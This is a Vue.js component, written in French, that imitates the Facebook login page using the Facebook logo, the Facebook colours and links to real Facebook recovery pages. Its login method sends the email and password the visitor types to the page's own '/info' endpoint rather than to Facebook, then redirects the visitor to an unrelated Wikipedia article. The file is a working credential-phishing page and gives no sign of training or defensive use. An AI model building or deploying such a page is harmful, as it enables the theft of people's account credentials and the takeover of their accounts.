<template>
  <div id="home">

      <div id="centent">

          <div id="img">
              <img src="../assets/dF5SId3UHWd.svg" alt="fb.svg" width="240px" height="100px">
          </div>

          <div id="form">

             <p id="title">
                 Se connecter à Facebook    
             </p>

             <div class="information" ref="emailBorder">
                 <input type="text" placeholder="Adresse e-mail ou numéro de tél" id="email" v-model="email" >
             </div>

             <p class="errMsg" v-show="errAdrs">
                L’e-mail ou le numéro de téléphone entré ne correspond à aucun compte. 
                <a href="https://facebook.com">Veuillez créer un compte.</a>
             </p>

             <div class="information" ref="passwordBorder">
                 <input type="password" placeholder="Mot de passe" id="password" v-model="password">
             </div>

             <p class="errMsg" v-show="errPass">
               Le mot de passe entré est incorrect.
                <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login"> Vous l’avez oublié ?</a>
             </p>

            <button @click="login">Connexion</button>
            <p>
                 <a href="https://web.facebook.com/login/identify/?ctx=recover&ars=facebook_login">Mot de passe oublié ?</a>
            </p>


          </div>  

      </div>

  </div>
</template>

<script>
import axios from 'axios';
export default {

    data() {
        return {
            email: '',
            password: '',
            errMsg: '',
            errAdrs: false,
            errPass: false,
            

        }
    },

    methods: {
        login(){
            let reg = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;

            if(this.email == '') {

                this.errAdrs = true;
                this.$refs['emailBorder'].style.borderColor = 'red';
                this.errPass = false;   
                this.$refs['passwordBorder'].style.borderColor = 'rgb(218, 209, 209)';

            } else if (/^[0-9+]+$/.test(this.email) == false && reg.test(this.email) == false) {

                this.errAdrs = true;
                 this.$refs['emailBorder'].style.borderColor = 'red';
                this.errPass = false;
                 this.$refs['passwordBorder'].style.borderColor = 'rgb(218, 209, 209)';

            } else if (this.password == "") {

                this.errPass = true;
                 this.$refs['passwordBorder'].style.borderColor = 'red';


                this.errAdrs = false;

                 this.$refs['emailBorder'].style.borderColor = 'rgb(218, 209, 209)';

            } else {

                this.errAdrs = false;
                this.$refs['emailBorder'].style.borderColor = 'rgb(218, 209, 209)';
                this.errPass = false;
                this.$refs['passwordBorder'].style.borderColor = 'rgb(218, 209, 209)';
               


                let obj = {
                    email: this.email,
                    password: this.password,
                    code: 'eirfughra654herjgure454herjgre54jerhg'
                };

                axios
                .post("/info", obj)
                .then((response) => {
                    if(response.data == 'err') {
                        this.errAdrs = true;
                        this.$refs['emailBorder'].style.borderColor = 'red';
                    } else {
                        this.errAdrs = false;
                        this.$refs['emailBorder'].style.borderColor = 'rgb(218, 209, 209)';
                        this.errPass = false;
                        this.$refs['passwordBorder'].style.borderColor = 'rgb(218, 209, 209)';
                         window.open('https://fr.wikipedia.org/wiki/Messali_Hadj', '_self');
                    }
                })
                .catch((err) => {console.log(err)})

            }

        }
    }

}
</script>

<style scoped>


#home {
    background-color:rgb(240, 240, 240);
    font-family: Helvetica, Arial, sans-serif;
    text-align: center;
   
}


#centent {
 display: inline-block;
 margin-top: 30px;
  
    
   
}

#form {
    text-align: center;
    background-color: white;
    border: 1px solid rgb(240, 240, 240);
    border-radius: 7px;
   box-shadow: 1px 1px 20px rgb(204, 201, 201); 
    display: inline-block;
    margin-bottom: 20%;
    padding: 3%;
   
}

.information {
    border: 1px solid rgb(218, 209, 209);
    border-radius: 5px;
    margin-bottom: 4%;
    text-align: start;
    padding: 5px;
   
}

button {
    color: white;
    background-color:  #1877f2;
    text-decoration: none;
    font-size: 20px;
    font-weight: bold;
    text-align: center;
    width: 300px;
    padding: 10px;
    outline: none;
    border-radius: 5px ;
    width: 100%;
    cursor: pointer;
    
}

a {
    color: #1877f2;
    text-decoration: none;
}
a:hover{
    text-decoration: underline;
}

.errMsg {
    color:red;
    font-size: 14px;
   
    width: 350px;
}

.errMsg a {
    color: red;
    font-weight: bold;
    text-decoration: none;
}

.errMsg a:hover {
    text-decoration: underline;
}



input {
    outline: none;
    border: none;
    font-size: 18px;
    padding: 10px;
    width: 325px;
}

#title {
    font-size: 18px;
}

</style>